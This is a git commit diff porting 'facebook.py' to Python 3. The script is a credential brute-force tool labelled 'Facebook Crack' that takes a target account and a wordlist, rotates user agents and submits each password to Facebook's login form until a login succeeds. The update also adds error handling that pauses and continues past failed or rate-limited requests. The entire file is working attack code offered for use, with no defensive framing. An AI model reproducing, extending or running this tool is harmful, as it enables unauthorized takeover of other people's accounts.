22821dbe8dced18551370b56e195eb378d5dce95
Ha3MrX <33704360+Ha3MrX@users.noreply.github.com>
2026-03-31 01:36:10 +0300

    Update facebook.py

--- facebook.py
+++ facebook.py
@@ -1,88 +1,97 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: UTF-8 -*-
 
 import sys
-import mechanize
-import cookielib
 import random
+import time
 
+# You might need to install these: pip3 install mechanize
+try:
+    import mechanize
+    import http.cookiejar as cookielib
+except ImportError:
+    print("[!] Please install mechanize: pip3 install mechanize")
+    sys.exit()
 
+# Setup headers and browser settings
+useragents = [
+    ('User-agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0'),
+    ('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3')
+]
 
+login_url = 'https://www.facebook.com/login.php?login_attempt=1'
 
-email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))
-
-
-passwordlist = str(raw_input("Enter the wordlist name and path : "))
-
-
-login = 'https://www.facebook.com/login.php?login_attempt=1'
-
-
-useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-
-def main():
-	global br
-	br = mechanize.Browser()
-	cj = cookielib.LWPCookieJar()
-	br.set_handle_robots(False)
-	br.set_handle_redirect(True)
-	br.set_cookiejar(cj)
-	br.set_handle_equiv(True)
-	br.set_handle_referer(True)
-	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-	welcome()
-	search()
-	print("Password does not exist in the wordlist")
-
-	
-	
-def brute(password):
-	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
-	sys.stdout.flush()
-	br.addheaders = [('User-agent', random.choice(useragents))]
-	site = br.open(login)
-	br.select_form(nr = 0)
-	br.form['email'] = email
-	br.form['pass'] = password
-	sub = br.submit()
-	log = sub.geturl()
-	if log != login and (not 'login_attempt' in log):
-			print("\n\n[+] Password Find = {}".format(password))
-			raw_input("ANY KEY to Exit....")
-			sys.exit(1)
-
-			
-def search():
-	global password
-	passwords = open(passwordlist,"r")
-	for password in passwords:
-		password = password.replace("\n","")
-		brute(password)
-
-		
-#welcome 
-def welcome():
-	wel = """
-
+def welcome(email, passwordlist):
+    wel = """
         +=========================================+
         |..........   Facebook Crack   ...........|
         +-----------------------------------------+
         |            #Author: Ha3MrX              | 
-        |	       Version 1.0                |
- 	|   https://www.youtube.com/c/HA-MRX      |
+        |            Version 1.0 (Py3)            |
+        |     https://www.youtube.com/c/HA-MRX    |
         +=========================================+
         |..........  Facebook Cracker  ...........|
         +-----------------------------------------+\n\n
-"""
-	total = open(passwordlist,"r")
-	total = total.readlines()
-	print wel 
-	print " [*] Account to crack : {}".format(email)
-	print " [*] Loaded :" , len(total), "passwords"
-	print " [*] Cracking, please wait ...\n\n"
+    """
+    try:
+        with open(passwordlist, "r", encoding="utf-8", errors="ignore") as f:
+            total = f.readlines()
+        print(wel)
+        print(f" [*] Account to crack : {email}")
+        print(f" [*] Loaded : {len(total)} passwords")
+        print(" [*] Cracking, please wait ...\n\n")
+    except FileNotFoundError:
+        print(f"[!] Error: Wordlist file '{passwordlist}' not found.")
+        sys.exit()
 
-	
+def brute(password, br, email):
+    sys.stdout.write(f"\r[*] Trying ..... {password}")
+    sys.stdout.flush()
+    
+    br.addheaders = [random.choice(useragents)]
+    try:
+        br.open(login_url)
+        br.select_form(nr=0)
+        br.form['email'] = email
+        br.form['pass'] = password
+        sub = br.submit()
+        log = sub.geturl()
+        
+        # Check if login was successful
+        if log != login_url and ('login_attempt' not in log):
+            print(f"\n\n[+] Password Found = {password}")
+            input("Press ANY KEY to Exit....")
+            sys.exit(1)
+    except Exception as e:
+        # Handle connection errors or rate limits
+        time.sleep(2)
+
+def search(email, passwordlist, br):
+    try:
+        with open(passwordlist, "r", encoding="utf-8", errors="ignore") as passwords:
+            for password in passwords:
+                password = password.strip()
+                brute(password, br, email)
+    except KeyboardInterrupt:
+        print("\n[!] Stopped by user.")
+        sys.exit()
+
+def main():
+    email = input("Enter the Facebook Username/Email/Phone: ")
+    passwordlist = input("Enter the wordlist name and path: ")
+
+    br = mechanize.Browser()
+    cj = cookielib.LWPCookieJar()
+    br.set_handle_robots(False)
+    br.set_handle_redirect(True)
+    br.set_cookiejar(cj)
+    br.set_handle_equiv(True)
+    br.set_handle_referer(True)
+    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+
+    welcome(email, passwordlist)
+    search(email, passwordlist, br)
+    print("\n[!] Password does not exist in the wordlist")
+
 if __name__ == '__main__':
-	main()
-
-
+    main()
